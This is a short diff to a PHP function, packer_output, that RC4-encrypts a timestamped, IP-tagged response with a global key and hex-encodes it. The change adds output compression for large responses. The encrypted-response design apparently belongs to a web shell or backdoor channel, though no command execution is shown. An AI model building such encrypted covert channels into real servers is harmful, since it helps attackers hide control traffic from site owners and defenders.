@@ -532,7 +532,11 @@ function packer_output($str){
 	header("Cache-Control: no-cache");
 	header("Pragma: no-cache");
     $str = @date("d-M-Y H:i:s",time()).'|'.$_SERVER['REMOTE_ADDR'].'|0|'.$str;
-    echo bin2hex(rc4($GLOBALS['cipher_key'], $str));
+    $c = bin2hex(rc4($GLOBALS['cipher_key'], $str));
+    if (strlen($c) > 10240) {
+        @ini_set('zlib.output_compression', TRUE);
+    }
+    echo $c;
 	die();
 }
 
